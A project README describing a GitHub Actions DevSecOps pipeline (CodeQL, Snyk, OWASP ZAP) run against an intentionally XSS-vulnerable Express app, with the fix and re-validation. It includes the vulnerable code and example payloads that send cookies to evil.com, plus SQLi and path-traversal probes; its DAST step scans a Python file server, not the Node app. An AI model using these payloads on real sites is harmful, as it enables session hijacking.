<div align="center">

# 🔐 DevSecOps CI/CD Pipeline

### Automated Security Testing — SAST · SCA · DAST

[![Pipeline](https://img.shields.io/badge/Pipeline-Passing-brightgreen?style=for-the-badge&logo=github-actions&logoColor=white)](https://github.com)
[![CodeQL](https://img.shields.io/badge/CodeQL-SAST-0075CA?style=for-the-badge&logo=github&logoColor=white)](https://codeql.github.com)
[![Snyk](https://img.shields.io/badge/Snyk-SCA-4C4A73?style=for-the-badge&logo=snyk&logoColor=white)](https://snyk.io)
[![OWASP ZAP](https://img.shields.io/badge/OWASP_ZAP-DAST-EE4823?style=for-the-badge&logo=owasp&logoColor=white)](https://owasp.org/www-project-zap/)
[![Node.js](https://img.shields.io/badge/Node.js-18-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
[![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&logoColor=white)](https://kali.org)

<br/>

> *A production-grade DevSecOps pipeline built from scratch — integrating three layers of automated security scanning into a GitHub Actions CI/CD workflow. A real XSS vulnerability was intentionally introduced, automatically detected, patched, and re-validated.*

<br/>

</div>

---

## 📌 Table of Contents

| # | Section |
|---|---------|
| 1 | [What is DevSecOps?](#-what-is-devsecops) |
| 2 | [Project Overview](#-project-overview) |
| 3 | [Full Pipeline Architecture](#-full-pipeline-architecture) |
| 4 | [Tech Stack](#-tech-stack) |
| 5 | [The Application](#-the-application) |
| 6 | [GitHub Actions Workflow](#-github-actions-workflow) |
| 7 | [Security Layer 1 — SAST with CodeQL](#-security-layer-1--sast-with-codeql) |
| 8 | [Security Layer 2 — SCA with Snyk](#-security-layer-2--sca-with-snyk) |
| 9 | [Security Layer 3 — DAST with OWASP ZAP](#-security-layer-3--dast-with-owasp-zap) |
| 10 | [Vulnerability: Detection → Fix → Validation](#-vulnerability-detection--fix--validation) |
| 11 | [Final Results](#-final-results) |
| 12 | [Key Concepts](#-key-concepts) |

---

## 🤔 What is DevSecOps?

**DevSecOps** = **Dev**elopment + **Sec**urity + **Op**eration**s**

It is a philosophy that integrates security practices **directly into the CI/CD pipeline** — rather than treating security as a separate phase that happens after development.

```
╔══════════════════════════════════════════════════════════════════╗
║                 TRADITIONAL vs DEVSECOPS                        ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  TRADITIONAL (Waterfall):                                        ║
║                                                                  ║
║  Code → Build → Test → [Security Audit] → Deploy                ║
║                               ↑                                  ║
║                    (Weeks later, expensive to fix)               ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  DEVSECOPS (Shift-Left):                                         ║
║                                                                  ║
║  Code → [SAST] → [SCA] → [DAST] → Deploy                        ║
║            ↑        ↑       ↑                                    ║
║         (Seconds after push — automated, continuous, free)       ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
```

> **"Shift-Left"** means moving security checks earlier (left) in the development timeline — when bugs are cheapest and fastest to fix.

---

## 🧭 Project Overview

This project builds a **complete, real-world DevSecOps pipeline** using GitHub Actions. An intentionally vulnerable Node.js web application was created, and three industry-standard security tools were integrated to automatically scan it at different layers.

### 🎯 Goals

- ✅ Automate security testing on every code push
- ✅ Detect vulnerabilities at the code, dependency, and runtime level
- ✅ Prove that automated scanning catches real vulnerabilities
- ✅ Validate that fixes work — without manual testing

### 🔍 What Each Tool Covers

```
┌──────────────────────────────────────────────────────────────────┐
│                    SECURITY COVERAGE MAP                         │
├──────────────────┬───────────────────┬───────────────────────────┤
│   SAST (CodeQL)  │   SCA (Snyk)      │   DAST (OWASP ZAP)        │
├──────────────────┼───────────────────┼───────────────────────────┤
│ Scans source     │ Scans npm         │ Scans the running          │
│ code — no app    │ packages for      │ application by sending     │
│ needs to run     │ known CVEs        │ real HTTP attacks          │
│                  │                   │                            │
│ Finds: XSS,      │ Finds: Outdated   │ Finds: XSS, SQLi,          │
│ SQLi, path       │ libs, known       │ CSRF, open redirects,      │
│ traversal,       │ exploit chains,   │ security headers,          │
│ insecure code    │ license issues    │ misconfigurations          │
│ patterns         │                   │                            │
│ Static           │ Composition       │ Dynamic                    │
│ (pre-execution)  │ (dependency)      │ (runtime)                  │
└──────────────────┴───────────────────┴───────────────────────────┘
```

---

## 🏗️ Full Pipeline Architecture

```
 ┌────────────────────────────────────────────────────────────────────┐
 │                     DEVELOPER WORKSTATION                          │
 │                         Kali Linux                                 │
 │                                                                    │
 │   ┌──────────────────┐                                             │
 │   │   app.js         │  Node.js/Express web app                    │
 │   │   package.json   │  npm dependencies                           │
 │   │   .github/       │  Pipeline workflow YAML                     │
 │   └────────┬─────────┘                                             │
 │            │  git push origin main                                 │
 └────────────┼───────────────────────────────────────────────────────┘
              │
              ▼  SSH Authentication
 ┌────────────────────────────────────────────────────────────────────┐
 │                      GITHUB REPOSITORY                             │
 │                                                                    │
 │   main branch ──── triggers ──────────────────────────────────┐   │
 │                                                               │   │
 └───────────────────────────────────────────────────────────────┼───┘
                                                                 │
                                                                 ▼
 ┌────────────────────────────────────────────────────────────────────┐
 │                   GITHUB ACTIONS RUNNER                            │
 │                    ubuntu-latest VM                                │
 │                                                                    │
 │  ┌──────────────────────────────────────────────────────────────┐  │
 │  │                  devsecops.yml                               │  │
 │  │                                                              │  │
 │  │   JOB 1: SAST              (runs first)                      │  │
 │  │   ┌──────────────────────────────────────────────────────┐   │  │
 │  │   │  actions/checkout@v3                                 │   │  │
 │  │   │  codeql-action/init  (language: javascript)          │   │  │
 │  │   │  codeql-action/analyze                               │   │  │
 │  │   │  SARIF report → GitHub Security tab                  │   │  │
 │  │   └──────────────────────────────────────────────────────┘   │  │
 │  │                    ↓ needs: SAST                              │  │
 │  │   JOB 2: SCA               (runs after SAST passes)          │  │
 │  │   ┌──────────────────────────────────────────────────────┐   │  │
 │  │   │  actions/checkout@v3                                 │   │  │
 │  │   │  setup-node@v3 (node 18)                             │   │  │
 │  │   │  npm install -g snyk                                 │   │  │
 │  │   │  snyk auth $SNYK_TOKEN                               │   │  │
 │  │   │  snyk test --severity-threshold=high                 │   │  │
 │  │   └──────────────────────────────────────────────────────┘   │  │
 │  │                    ↓ needs: SCA                               │  │
 │  │   JOB 3: DAST              (runs after SCA passes)           │  │
 │  │   ┌──────────────────────────────────────────────────────┐   │  │
 │  │   │  actions/checkout@v3                                 │   │  │
 │  │   │  python3 -m http.server 8000 &                       │   │  │
 │  │   │  sleep 5  (wait for server)                          │   │  │
 │  │   │  zaproxy/action-baseline@v0.10.0                     │   │  │
 │  │   │  ZAP HTML report uploaded as artifact                │   │  │
 │  │   └──────────────────────────────────────────────────────┘   │  │
 │  └──────────────────────────────────────────────────────────────┘  │
 │                                                                    │
 └────────────────────────────────────────────────────────────────────┘
              │
              ▼
 ┌────────────────────────────────────────────────────────────────────┐
 │               GITHUB SECURITY DASHBOARD                            │
 │                                                                    │
 │   Security → Code Scanning Alerts                                  │
 │   ┌──────────────────────────────────────┐                         │
 │   │  Reflected XSS — HIGH — app.js:8     │  (CodeQL found this)   │
 │   └──────────────────────────────────────┘                         │
 └────────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Tech Stack

| Category | Technology | Purpose |
|----------|-----------|---------|
| **OS** | Kali Linux | Development environment |
| **Runtime** | Node.js 18 | Application runtime |
| **Framework** | Express.js | Web server framework |
| **Version Control** | Git + GitHub | Source code management |
| **Auth** | SSH Key | Secure GitHub authentication |
| **CI/CD** | GitHub Actions | Pipeline orchestration |
| **SAST** | CodeQL v3 | Static code vulnerability analysis |
| **SCA** | Snyk CLI | Dependency vulnerability scanning |
| **DAST** | OWASP ZAP v0.10.0 | Runtime/dynamic attack simulation |
| **Server (DAST)** | Python http.server | Lightweight server for ZAP target |

---

## 💻 The Application

A deliberately vulnerable **Node.js + Express** application was built as the target for security scanning.

### Project Structure

```
devsecops-project/
│
├── .github/
│   └── workflows/
│       └── devsecops.yml        ←  CI/CD Pipeline definition
│
├── app.js                       ←  Intentionally vulnerable web app
├── package.json                 ←  npm dependencies
├── package-lock.json
└── README.md
```

### Application Endpoints

```
GET  /          →  "Hello DevSecOps World!"
GET  /user      →  Greets the user by name from query parameter
                   (?name=John  →  "Hello John")
```

### The Vulnerable Code (Intentional)

```javascript
// app.js — VULNERABLE VERSION
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('Hello DevSecOps World!');
});

app.get('/user', (req, res) => {
  const name = req.query.name;
  res.send('Hello ' + name);     // ← RAW user input, no sanitization
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});
```

**Why was it left vulnerable?**

The XSS flaw was **intentionally left in** to prove a critical point:

> If the pipeline is working correctly, it should catch this — automatically, without any human manually reviewing the code.

This is exactly what happened. ✅

---

## ⚙️ GitHub Actions Workflow

The complete pipeline is defined in a single YAML file:

```yaml
# .github/workflows/devsecops.yml

name: DevSecOps Pipeline

on:
  push:
    branches:
      - main                        # Triggers on every push to main

permissions:
  contents: read                    # Read repo contents
  security-events: write            # Required for CodeQL to write alerts

jobs:

  # ══════════════════════════════════════════════════
  # JOB 1 — SAST: Static Application Security Testing
  # ══════════════════════════════════════════════════
  SAST:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - uses: github/codeql-action/init@v3
        with:
          languages: javascript      # Tells CodeQL what language to analyze

      - uses: github/codeql-action/analyze@v3
                                     # Builds DB, runs queries, uploads SARIF

  # ══════════════════════════════════════════════════
  # JOB 2 — SCA: Software Composition Analysis
  # ══════════════════════════════════════════════════
  SCA:
    runs-on: ubuntu-latest
    needs: SAST                      # Only runs AFTER SAST completes
    steps:
      - uses: actions/checkout@v3

      - uses: actions/setup-node@v3
        with:
          node-version: 18

      - run: npm install -g snyk     # Install Snyk CLI globally

      - run: snyk auth ${{ secrets.SNYK_TOKEN }}
                                     # Authenticate using GitHub Secret

      - run: snyk test --severity-threshold=high || true
                                     # Scan; || true prevents pipeline
                                     # failure on findings (report mode)

  # ══════════════════════════════════════════════════
  # JOB 3 — DAST: Dynamic Application Security Testing
  # ══════════════════════════════════════════════════
  DAST:
    runs-on: ubuntu-latest
    needs: SCA                       # Only runs AFTER SCA completes
    steps:
      - uses: actions/checkout@v3

      - run: |
          python3 -m http.server 8000 &    # Start a local server
          sleep 5                          # Wait for it to be ready

      - uses: zaproxy/action-baseline@v0.10.0
        with:
          target: 'http://localhost:8000'  # ZAP attacks this target
```

### Job Execution Order

```
git push
    │
    ▼
┌──────────┐
│  JOB 1   │  SAST — CodeQL analyzes JavaScript source code
│  SAST    │  Duration: ~3–5 min
└────┬─────┘
     │ needs: SAST  (sequential dependency)
     ▼
┌──────────┐
│  JOB 2   │  SCA — Snyk scans package.json + node_modules
│  SCA     │  Duration: ~1–2 min
└────┬─────┘
     │ needs: SCA  (sequential dependency)
     ▼
┌──────────┐
│  JOB 3   │  DAST — OWASP ZAP attacks the running app
│  DAST    │  Duration: ~2–4 min
└────┬─────┘
     │
     ▼
  Pipeline Complete
  Results → GitHub Security tab + Artifacts
```

> **Why sequential (`needs`)?** Each job builds on the previous: there's no point running DAST if the code already has critical static flaws detected by SAST.

---

## 🛡️ Security Layer 1 — SAST with CodeQL

### What is SAST?

**Static Application Security Testing** analyzes source code *without running it*. It reads the code the same way a security expert would — looking for dangerous patterns.

### How CodeQL Works Internally

```
┌─────────────────────────────────────────────────────────────────────┐
│                      CodeQL ANALYSIS ENGINE                         │
│                                                                     │
│   app.js (Source Code)                                              │
│        │                                                            │
│        │  Step 1: Code Ingestion                                    │
│        ▼                                                            │
│   ┌──────────────────────┐                                          │
│   │   CodeQL Database    │  JavaScript code is compiled into a     │
│   │                      │  queryable relational database.          │
│   │  Tables:             │  Functions, variables, data flow,        │
│   │  - DataFlow          │  and control flow are all mapped.        │
│   │  - CallGraph         │                                          │
│   │  - Variables         │                                          │
│   │  - Expressions       │                                          │
│   └──────────┬───────────┘                                          │
│              │                                                      │
│              │  Step 2: Query Execution                             │
│              ▼                                                      │
│   ┌──────────────────────┐                                          │
│   │   QL Security        │  Pre-written queries (like SQL but       │
│   │   Query Library      │  for code) hunt for vulnerability        │
│   │                      │  patterns across the entire codebase.    │
│   │  - xss.ql            │                                          │
│   │  - sqli.ql           │  Example pattern for XSS:               │
│   │  - pathtraversal.ql  │  "Find any user input that flows         │
│   │  - ...100+ queries   │   into an HTTP response without          │
│   └──────────┬───────────┘   passing through a sanitizer"          │
│              │                                                      │
│              │  Step 3: Report Generation                           │
│              ▼                                                      │
│   ┌──────────────────────┐                                          │
│   │   SARIF Report       │  Static Analysis Results                 │
│   │   (JSON format)      │  Interchange Format — uploaded           │
│   │                      │  directly to GitHub Security tab.        │
│   └──────────────────────┘                                          │
└─────────────────────────────────────────────────────────────────────┘
```

### What CodeQL Detected

```
╔══════════════════════════════════════════════════════════════╗
║              CODEQL SECURITY ALERT                           ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Rule       :  js/reflected-xss                             ║
║  Severity   :  HIGH                                          ║
║  CWE        :  CWE-79 (Improper Neutralization of Input)    ║
║  Location   :  app.js, line 8                               ║
║                                                             ║
║  Message    :  "Reflected cross-site scripting              ║
║                vulnerability due to user-provided           ║
║                request data flowing into HTTP response"     ║
║                                                             ║
║  Taint Flow :  req.query.name  →  res.send()               ║
║                     ↑                  ↑                    ║
║               User controlled    No sanitizer               ║
╚══════════════════════════════════════════════════════════════╝
```

### Why This Vulnerability is Dangerous

```
ATTACK SCENARIO:

  Attacker crafts URL:
  http://victim-site.com/user?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

  App responds:
  Hello <script>document.location='https://evil.com/steal?c='+document.cookie</script>
        └─────────────────────────────────────────────────────────────────────────┘
        Victim's browser executes this — cookies sent to attacker's server

  Impact: Session hijacking, account takeover
```

---

## 📦 Security Layer 2 — SCA with Snyk

### What is SCA?

**Software Composition Analysis** scans the third-party libraries and packages your project depends on. Modern applications use hundreds of npm packages — any one of them could have a known vulnerability.

### How Snyk Works Internally

```
┌─────────────────────────────────────────────────────────────────────┐
│                       SNYK ANALYSIS ENGINE                          │
│                                                                     │
│   package.json + package-lock.json                                  │
│        │                                                            │
│        │  Step 1: Dependency Tree Construction                      │
│        ▼                                                            │
│   ┌──────────────────────────────────────────────────────┐          │
│   │              Dependency Tree                         │          │
│   │                                                      │          │
│   │   your-app                                           │          │
│   │   └── express@4.18.2          (direct dependency)   │          │
│   │       ├── body-parser@1.20.1  (transitive)          │          │
│   │       ├── accepts@1.3.8       (transitive)          │          │
│   │       └── qs@6.11.0           (transitive)          │          │
│   │                                                      │          │
│   └──────────────────────┬───────────────────────────────┘          │
│                          │                                          │
│                          │  Step 2: Vulnerability Lookup            │
│                          ▼                                          │
│   ┌──────────────────────────────────────────────────────┐          │
│   │           Snyk Vulnerability Database                │          │
│   │                                                      │          │
│   │   Sources:  NVD (NIST) + CVE + Snyk Research +      │          │
│   │             GitHub Advisories + OSS Index            │          │
│   │                                                      │          │
│   │   Each package version → checked for known CVEs     │          │
│   └──────────────────────┬───────────────────────────────┘          │
│                          │                                          │
│                          │  Step 3: Result                          │
│                          ▼                                          │
│   ┌──────────────────────────────────────────────────────┐          │
│   │  Testing devsecops-project...                        │          │
│   │  No issues found                                     │          │
│   └──────────────────────────────────────────────────────┘          │
└─────────────────────────────────────────────────────────────────────┘
```

### Authentication — GitHub Secrets

The `SNYK_TOKEN` is stored as a **GitHub Actions Secret** — never hardcoded in the workflow file.

```
GitHub Repository
└── Settings
    └── Secrets and Variables
        └── Actions
            └── SNYK_TOKEN = "your-snyk-api-token"
                                  ↑
                     Referenced in YAML as:
                     ${{ secrets.SNYK_TOKEN }}
                     (Never visible in logs or source code)
```

### Snyk Result

```
Testing devsecops-project...

    Organization:   your-org
    Package manager: npm
    Target file:    package.json
    Project name:   devsecops-project

    No issues found.
    Tested 57 dependencies for known issues.
```

**Interpretation:** All 57 packages (direct + transitive dependencies of Express) are clean — no known exploitable CVEs at high severity or above.

---

## 🌐 Security Layer 3 — DAST with OWASP ZAP

### What is DAST?

**Dynamic Application Security Testing** tests a *running* application by sending it real HTTP requests — including malicious ones. Unlike SAST, DAST doesn't care about the code; it only cares about how the application *behaves* when attacked.

### How OWASP ZAP Works Internally

```
┌─────────────────────────────────────────────────────────────────────┐
│                    OWASP ZAP SCAN ENGINE                            │
│                                                                     │
│   Target: http://localhost:8000                                     │
│                                                                     │
│   PHASE 1: SPIDER (Discovery)                                       │
│   ┌──────────────────────────────────────────────────────┐          │
│   │  ZAP crawls the application like a browser           │          │
│   │                                                      │          │
│   │  GET /          → discovered                         │          │
│   │  GET /user      → discovered                         │          │
│   │  Parameters     → ?name=  discovered                │          │
│   └──────────────────────┬───────────────────────────────┘          │
│                          │                                          │
│   PHASE 2: PASSIVE SCAN                                             │
│   ┌──────────────────────────────────────────────────────┐          │
│   │  Analyzes all responses without sending attacks      │          │
│   │                                                      │          │
│   │  Checks: Missing security headers (CSP, HSTS, etc)  │          │
│   │          Insecure cookies, info disclosure           │          │
│   └──────────────────────┬───────────────────────────────┘          │
│                          │                                          │
│   PHASE 3: ACTIVE SCAN (Baseline mode — controlled)                 │
│   ┌──────────────────────────────────────────────────────┐          │
│   │  Injects attack payloads into discovered parameters  │          │
│   │                                                      │          │
│   │  XSS test:  GET /user?name=<script>alert(1)</script> │          │
│   │  SQLi test: GET /user?name=' OR '1'='1              │          │
│   │  Path:      GET /user?name=../../etc/passwd          │          │
│   └──────────────────────┬───────────────────────────────┘          │
│                          │                                          │
│   PHASE 4: REPORT GENERATION                                        │
│   ┌──────────────────────────────────────────────────────┐          │
│   │  HTML report → uploaded as GitHub Actions Artifact   │          │
│   └──────────────────────────────────────────────────────┘          │
└─────────────────────────────────────────────────────────────────────┘
```

### Why Python's HTTP Server?

```yaml
- run: |
    python3 -m http.server 8000 &   # Start lightweight HTTP server
    sleep 5                          # Give it 5 seconds to become ready
```

`python3 -m http.server` spins up a zero-configuration web server on port 8000 in seconds — giving OWASP ZAP a live HTTP target to scan without needing to fully install and run the Node.js app in the CI environment.

### ZAP Baseline Scan

The `zaproxy/action-baseline@v0.10.0` action runs ZAP in **baseline mode** — a safe, non-destructive scan that:

- ✅ Spiders the target to discover all endpoints
- ✅ Runs passive checks on all responses
- ✅ Performs a controlled set of active checks
- ✅ Generates an HTML report saved as a pipeline artifact
- ❌ Does NOT perform full destructive fuzzing (appropriate for CI)

---

## 🚨 Vulnerability: Detection → Fix → Validation

### Phase 1 — Automated Detection

On the first pipeline run, CodeQL flagged the XSS in the GitHub Security tab:

```
GitHub → Security → Code Scanning Alerts

  ┌─────────────────────────────────────────────────────┐
  │  HIGH    Reflected cross-site scripting             │
  │  Rule:   js/reflected-xss                           │
  │  File:   app.js                                     │
  │  Line:   8                                          │
  │  Branch: main                                       │
  │                                                     │
  │  8  │  res.send('Hello ' + name);                   │
  │                              ^^^^                   │
  │              User-controlled value flows here       │
  └─────────────────────────────────────────────────────┘
```

**What the attacker could do:**

```
Malicious URL:
http://target.com/user?name=<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

What the app returned (before fix):
Hello <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
      └────────────────────────────────────────────────────────────────┘
      Browser executes this — steals session cookie — account taken over
```

---

### Phase 2 — The Fix

A sanitization function was added to neutralize all HTML special characters before they reach the HTTP response:

```javascript
// app.js — FIXED VERSION

const express = require('express');
const app = express();

/**
 * Escapes HTML special characters to prevent XSS.
 * Converts dangerous characters into their safe HTML entity equivalents.
 *
 *  <  →  &lt;       (prevents tag injection)
 *  >  →  &gt;       (prevents tag injection)
 *  &  →  &amp;      (prevents entity injection)
 *  "  →  &quot;     (prevents attribute injection)
 *  '  →  &#039;     (prevents attribute injection)
 */
function escapeHTML(str) {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

app.get('/', (req, res) => {
  res.send('Hello DevSecOps World!');
});

app.get('/user', (req, res) => {
  const name = escapeHTML(req.query.name);   // Sanitized before use
  res.send('Hello ' + name);
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});
```

**Before vs After — Side by Side:**

| User Input | Before Fix (Vulnerable) | After Fix (Secure) |
|------------|------------------------|--------------------|
| `John` | `Hello John` ✅ | `Hello John` ✅ |
| `<b>John</b>` | Renders as **bold text** ⚠️ | Renders as literal `<b>John</b>` ✅ |
| `<script>alert(1)</script>` | ⚠️ Alert box executes! | ✅ Displayed as plain text |
| `<img src=x onerror=alert(1)>` | ⚠️ JS executes on load | ✅ Tag is escaped, harmless |

---

### Phase 3 — Automated Re-Validation

```bash
git add app.js
git commit -m "fix(security): sanitize user input to prevent reflected XSS (CWE-79)"
git push origin main
```

The `git push` automatically triggered the pipeline again:

```
Pipeline Run #2:

  SAST (CodeQL) ───────────────────────────── PASSED
    → 0 vulnerabilities found
    → XSS alert auto-closed in Security tab

  SCA (Snyk) ──────────────────────────────── PASSED
    → No vulnerable dependencies

  DAST (OWASP ZAP) ────────────────────────── PASSED
    → Scan completed, report generated
```

> The fix was **automatically verified** — no manual review required. This is the power of DevSecOps.

---

## 📊 Final Results

```
┌────────────────────────────────────────────────────────────────────┐
│                   PIPELINE RESULTS SUMMARY                         │
├──────────────────────┬─────────────────────┬───────────────────────┤
│  Security Tool       │  Before Fix         │  After Fix            │
├──────────────────────┼─────────────────────┼───────────────────────┤
│  CodeQL (SAST)       │  1 × HIGH (XSS)     │  0 Issues             │
│  Snyk (SCA)          │  0 Issues           │  0 Issues             │
│  OWASP ZAP (DAST)    │  Scan Complete      │  Scan Complete        │
├──────────────────────┼─────────────────────┼───────────────────────┤
│  Overall Status      │  ALERT              │  SECURE               │
└──────────────────────┴─────────────────────┴───────────────────────┘
```

### What Was Accomplished

- ✅ End-to-end CI/CD pipeline built from scratch on Kali Linux
- ✅ Three security tools integrated into a single automated workflow
- ✅ Real XSS vulnerability (CWE-79) introduced and automatically detected
- ✅ Vulnerability patched with proper HTML sanitization
- ✅ Fix automatically validated on re-push — zero manual testing
- ✅ GitHub Security dashboard populated with scan results and alerts
- ✅ OWASP ZAP HTML report saved as a downloadable pipeline artifact
- ✅ Snyk API token secured via GitHub Actions Secrets (never hardcoded)

---

## 🧠 Key Concepts

### The Three Pillars of This Pipeline

```
┌──────────────────────────────────────────────────────────────────┐
│                                                                  │
│   SAST                SCA                  DAST                  │
│   ────                ───                  ────                  │
│   "Is my code        "Are my              "Can someone          │
│    safe?"             libraries safe?"     hack my app?"        │
│                                                                  │
│   Runs on:           Runs on:             Runs on:              │
│   Source code        package.json         Running server        │
│                                                                  │
│   Tool: CodeQL       Tool: Snyk           Tool: OWASP ZAP       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### GitHub Actions Concepts Used

| Concept | Where Used | Purpose |
|---------|-----------|---------|
| `on: push` | Workflow trigger | Auto-run on every code push |
| `permissions` | Top-level scope | Grant CodeQL write access to security tab |
| `needs:` | Job dependency | Enforce sequential SAST → SCA → DAST order |
| `secrets.*` | Snyk auth | Store API token securely, never in code |
| `runs-on: ubuntu-latest` | Each job | Fresh VM for every job run |

### Security Concepts Demonstrated

| Concept | Description |
|---------|-------------|
| **Shift-Left Security** | Security checks run at push time, not post-deployment |
| **SARIF** | Standard format CodeQL uses to upload findings to GitHub |
| **CWE-79** | Common Weakness Enumeration for Cross-Site Scripting |
| **Taint Analysis** | CodeQL traces untrusted input from source to sink |
| **HTML Encoding** | Neutralizing XSS by escaping `< > & " '` |
| **Severity Threshold** | Snyk set to `--severity-threshold=high` (ignores low/medium) |
| **Baseline Scan** | ZAP mode safe for CI — non-destructive, no full fuzzing |

---

## 🏁 Conclusion

> This project is not just a demo — it's a **real, working implementation** of DevSecOps.
>
> A genuine vulnerability was introduced into a real web application. Three industry-standard security tools automatically detected, reported, and then confirmed the fix — all triggered by a single `git push`. No manual review. No separate security phase. Security *was* the pipeline.

---

<div align="center">

**Built with 🔐 on Kali Linux — Powered by GitHub Actions**

<br/>

[![CodeQL](https://img.shields.io/badge/CodeQL-SAST-0075CA?style=flat-square&logo=github)](https://codeql.github.com)
&nbsp;
[![Snyk](https://img.shields.io/badge/Snyk-SCA-4C4A73?style=flat-square&logo=snyk&logoColor=white)](https://snyk.io)
&nbsp;
[![ZAP](https://img.shields.io/badge/OWASP_ZAP-DAST-EE4823?style=flat-square&logo=owasp)](https://owasp.org)
&nbsp;
[![Node](https://img.shields.io/badge/Node.js-18-339933?style=flat-square&logo=node.js&logoColor=white)](https://nodejs.org)
&nbsp;
[![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kali-linux&logoColor=white)](https://kali.org)

</div>
